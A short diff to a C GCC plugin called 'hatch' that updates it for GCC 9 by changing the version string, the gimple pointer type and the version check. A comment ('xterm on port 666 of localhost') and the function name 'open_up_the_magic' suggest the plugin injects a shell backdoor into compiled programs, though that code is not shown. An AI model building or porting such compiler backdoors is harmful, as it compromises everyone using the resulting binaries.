@@ -53,14 +53,14 @@ int plugin_is_GPL_compatible = 1;
 
 static struct plugin_gcc_version hatch_version =
 {
-    .basever = "4.9",
+    .basever = "9",
 };
 
 
 /* We don't need to run any tests before we execute our plugin pass */
 static void open_up_the_magic(void)
 {
-    gimple call;
+    gimple *call;
     gimple_stmt_iterator gsi;
     tree proto, fndecl;
 
@@ -115,7 +115,7 @@ int plugin_init(struct plugin_name_args   *info,  /* Argument info  */
                 struct plugin_gcc_version *ver)   /* Version of GCC */
 {
     /* Check version */
-    if (strncmp(ver->basever, hatch_version.basever, strlen("4.6")))
+    if (strncmp(ver->basever, hatch_version.basever, strlen(hatch_version.basever)))
       return -1;
 
     /* xterm on port 666 of localhost */
